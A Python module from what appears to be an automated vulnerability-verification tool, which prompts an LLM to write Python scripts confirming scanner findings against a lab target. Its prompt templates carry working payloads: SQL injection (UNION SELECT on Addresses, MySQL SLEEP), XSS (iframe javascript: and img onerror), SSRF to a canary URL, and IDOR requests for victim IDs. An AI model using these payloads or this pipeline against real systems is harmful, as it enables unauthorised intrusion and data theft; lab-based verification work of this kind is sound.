"""LLM strategy engine. Any OpenAI-compatible endpoint (OpenAI, Gemini compat, Ollama /v1)."""
import re, requests
from jinja2 import Template
from ..ingestion.schema import Finding, VulnClass

SYSTEM = """You write a SINGLE self-contained Python 3 script (stdlib + requests, or playwright for XSS) that empirically
tests whether ONE reported vulnerability is real, against the lab target only.
Rules:
1. Always include explicit required imports: 'import os, sys, json, requests' (plus 'import uuid' for SSRF, or 'from playwright.sync_api import sync_playwright' for XSS). Never omit 'import json'.
2. Read TARGET_URL, AUTH_TOKEN, CANARY_URL, VICTIM_BASKET_ID, VICTIM_ADDRESS_ID from os.environ. When making requests, use f"{TARGET_URL}{path}" (or the finding's target URL); do not make requests to bare TARGET_URL if the finding has an endpoint path.
3. Make requests only to the lab target (and CANARY_URL if testing SSRF callback).
4. Keep runtime under 25 seconds; never loop forever.
5. As the LAST stdout line, print exactly one JSON object following the telemetry contract.
Output ONLY the code in one ```python block."""


def get_contract(f: Finding) -> str:
    if f.vuln_class == VulnClass.SQLI:
        if f.db_engine == "mysql":
            return (
                'completed(bool), baseline_ms(list of >=2 ints), payload_ms(list of >=2 ints), delay_s(int) '
                '[For MySQL target: use time-based injection e.g. SLEEP(delay_s), measure baseline_ms and payload_ms across >=2 trials, set delay_s. '
                'Oracle confirms if payload_ms is consistently slower by >= 0.8*delay]'
            )
        else:
            param_name = f.param or "q"
            return (
                'completed(bool), body(str) '
                f'[For SQLite target: SQLite has no SLEEP(); use 10-column UNION SELECT to extract seeded canary data into body e.g. from Addresses: '
                f'params={{"{param_name}": "q\')) UNION SELECT 1, streetAddress, \'desc\', 1, 0, \'img\', null, \'2020\', \'2020\', null FROM Addresses --"}}. '
                f'Send GET request to f"{{TARGET_URL}}{f.path}" with params; set completed = (response.status_code == 200), set body = response.text. '
                f'Do NOT check for canary inside the script; verifier code checks if canary_value in body]'
            )
    elif f.vuln_class == VulnClass.XSS:
        param_name = f.param or "q"
        route = f"{f.path}?{param_name}="
        return (
            'completed(bool), xss_fired(bool) [use sync playwright with headless Chromium. '
            'Define dialog_fired = [False] and register page.on("dialog", lambda d: (dialog_fired.append(True), d.accept())). '
            f'Wrap page.goto in try/except Exception: pass so navigation timeouts do not crash the script. '
            f'Try iframe javascript: payload first: try: page.goto(f"{{TARGET_URL}}{route}<iframe src=\\"javascript:alert(1)\\">", wait_until="domcontentloaded", timeout=10000); page.wait_for_timeout(3000) except Exception: pass. '
            f'If not dialog_fired[-1], retry in the same script with <img src=x onerror=...>: try: page.goto(f"{{TARGET_URL}}{route}<img src=x onerror=alert(1)>", wait_until="domcontentloaded", timeout=10000); page.wait_for_timeout(3000) except Exception: pass. '
            'Set xss_fired = dialog_fired[-1], completed = True; print json {"completed": completed, "xss_fired": xss_fired}]'
        )
    elif f.vuln_class == VulnClass.SSRF:
        param_name = f.param or "imageUrl"
        return (
            f'completed(bool), token(str uuid4) [import uuid; token = str(uuid.uuid4()); '
            f'Wrap the request logic in try/except: set completed = True once the HTTP request to \'{f.path}\' was sent '
            f'(whatever status code comes back), and False only if the request itself raised an exception. '
            f'Have the script try both: first send HTTP {f.method} to f"{{TARGET_URL}}{f.path}" with '
            f'data={{"{param_name}": f"{{CANARY_URL}}/{{token}}"}} and headers={{"Authorization": f"Bearer {{AUTH_TOKEN}}"}}; '
            f'if that returns a non-2xx, retry once more in the same script with '
            f'cookies={{"token": AUTH_TOKEN}}, data={{"{param_name}": f"{{CANARY_URL}}/{{token}}"}}, and '
            f'json={{"{param_name}": f"{{CANARY_URL}}/{{token}}"}}. '
            f'Print json {{"completed": completed, "token": token}}]'
        )
    elif f.vuln_class == VulnClass.IDOR:
        id_var = "VICTIM_ADDRESS_ID" if "address" in f.path.lower() else "VICTIM_BASKET_ID"
        example = f'f"{{TARGET_URL}}/api/Addresss/{{os.environ[\'{id_var}\']}}"' if "address" in f.path.lower() else f'f"{{TARGET_URL}}/rest/basket/{{os.environ[\'{id_var}\']}}"'
        return (
            f'completed(bool), status(int), body(str) [authenticate as User A using headers {{"Authorization": f"Bearer {{AUTH_TOKEN}}"}}. '
            f'Request TARGET_URL + the finding\'s own path pattern, substituting the target ID with os.environ["{id_var}"] '
            f'(for finding {f.path}, use {example}); never invent an ID. '
            f'Return status=response.status_code and body=response.text]'
        )
    return "completed(bool)"


CONTRACTS = {
    VulnClass.SQLI: (
        'completed(bool), body(str), baseline_ms(list of >=2 ints), payload_ms(list of >=2 ints), delay_s(int) '
        '[For SQLite targets: use UNION SELECT to extract canary into body. For MySQL: use SLEEP(delay_s) timing]'
    ),
    VulnClass.XSS: 'completed(bool), xss_fired(bool) [use sync playwright with headless Chromium; test dialog event]',
    VulnClass.SSRF: 'completed(bool), token(str uuid4) [send callback token to canary listener]',
    VulnClass.IDOR: 'completed(bool), status(int), body(str) [authenticate as User A, request victim resource]',
}

USER_T = Template("""Finding: {{ f.rule_id }} ({{ f.source }}), CWE-{{ f.cwe }}, class={{ f.vuln_class.value }}
Target: {{ f.method }} {{ f.url }}   parameter: {{ f.param }}   db_engine: {{ f.db_engine }}
Scanner evidence: {{ f.raw_evidence }}
Telemetry contract fields: {{ contract }}
{% if history %}Previous failed attempts (do NOT repeat them):
{% for h in history %}- attempt {{ h.n }}: exit={{ h.exit_code }} stderr={{ h.stderr[:300] }} stdout={{ h.stdout[:200] }}
{% endfor %}{% endif %}Write the script.""")


class OpenAICompatLLM:
    def __init__(self, base_url="http://localhost:11434/v1", model="qwen2.5-coder:7b", api_key="ollama"):
        self.base_url, self.model, self.api_key = base_url.rstrip("/"), model, api_key
        self.tokens_used = 0

    def complete(self, system: str, user: str) -> str:
        r = requests.post(f"{self.base_url}/chat/completions",
                          headers={"Authorization": f"Bearer {self.api_key}"},
                          json={"model": self.model, "temperature": 0.2,
                                "messages": [{"role": "system", "content": system},
                                             {"role": "user", "content": user}]}, timeout=180)
        r.raise_for_status()
        j = r.json()
        self.tokens_used += j.get("usage", {}).get("total_tokens", 0)
        return j["choices"][0]["message"]["content"]


class StrategyEngine:
    def __init__(self, llm):
        self.llm = llm

    def generate(self, f: Finding, history: list) -> str:
        contract = get_contract(f)
        user = USER_T.render(f=f, contract=contract, history=history)
        text = self.llm.complete(SYSTEM, user)
        m = re.search(r"```(?:python)?\n(.*?)```", text, re.S)
        return (m.group(1) if m else text).strip()
